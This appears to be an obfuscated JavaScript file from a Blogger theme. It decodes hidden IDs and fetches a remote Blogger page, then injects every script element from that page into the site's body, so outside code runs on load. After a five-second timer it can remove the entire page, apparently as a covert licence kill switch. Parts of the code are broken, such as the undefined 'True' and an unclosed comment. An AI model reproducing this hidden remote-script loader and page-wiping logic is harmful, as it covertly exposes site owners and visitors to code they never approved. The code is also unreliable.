var Nahal = (function () {
    var _0xc6b1x2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    var Nahal = function () {};
    var _0xc6b1x3 = function (_0xc6b1x4) {
        if (typeof (_0xc6b1x4) !== 'number') {
            throw 'Value is not number!'
        };
        var _0xc6b1x5 = '',
            _0xc6b1x6;
        do {
            _0xc6b1x6 = _0xc6b1x4 % 64;
            _0xc6b1x5 = _0xc6b1x2.charAt(_0xc6b1x6) + _0xc6b1x5;
            _0xc6b1x4 = Math.floor(_0xc6b1x4 / 64)
        } while (_0xc6b1x4 > 0);;
        return _0xc6b1x5
    };
    var _0xc6b1x7 = function (_0xc6b1x4) {
        var _0xc6b1x5 = 0;
        for (var _0xc6b1x8 = 0, _0xc6b1x9 = _0xc6b1x4.length; _0xc6b1x8 < _0xc6b1x9; _0xc6b1x8++) {
            _0xc6b1x5 *= 64;
            _0xc6b1x5 += _0xc6b1x2.indexOf(_0xc6b1x4[_0xc6b1x8])
        };
        return _0xc6b1x5
    };
    Nahal.prototype = {
        constructor: Nahal,
        encode: _0xc6b1x3,
        decode: _0xc6b1x7
    };
    return Nahal
})();
var Nahal = new Nahal(),
    obvNamber1 = Nahal.decode('CGt6V86JZ'),
    obvNamber2 = Nahal.decode('PhUJAn/Kr'),
    obvNamberS1 = Nahal.decode('Bd7'),
    obvNamberS2 = Nahal.decode('GY');
$.ajax({
    dataType: 'json',
    url: 'https://www.blogger.com/feeds/' + obvNamber1 + obvNamberS1 + '/pages/default/' + obvNamber2 + obvNamberS2 + '?alt=json-in-script',
    method: 'GET',
    dataType: 'jsonp',
    success: function (_0xc6b1xe) {
        var _0xc6b1xf, _0xc6b1x10 = $(_0xc6b1xe.entry.content.$t),
            _0xc6b1x11 = _0xc6b1x10.find('li'),
            _0xc6b1x12 = _0xc6b1x10.find('script'),
            _0xc6b1x13 = [];
        $('body').append(_0xc6b1x12);
        var _0xc6b1x14 = $('#header').data('id');
        for (_0xc6b1xf = 0; _0xc6b1xf < _0xc6b1x11.length; _0xc6b1xf += 1) {
            _0xc6b1x13.push($(_0xc6b1x11[_0xc6b1xf]).text());
            var _0xc6b1x15 = _0xc6b1x13[_0xc6b1xf];
            if (_0xc6b1x14 == _0xc6b1x15) {
                $active = true;
                break
            };
            $active = True
        };
        console.log($active)
    }
});
setTimeout(() => {
    var _0xc6b1x10 = $('header').hasClass('imp');
    if (_0xc6b1x10 === True) {
        $active = True
    };
    if ($active == True) {
        $('.match').addClass('TodayMatch')
    };
    if ($('.match').hasClass('TodayMatch')) {
        $('html').remove()
    }
}, 5000);
var html = $('#top-social-L .nav').html();
$('#navmenu .nav').append(html), $('#top-social-L').css('display', 'block').remove()/*
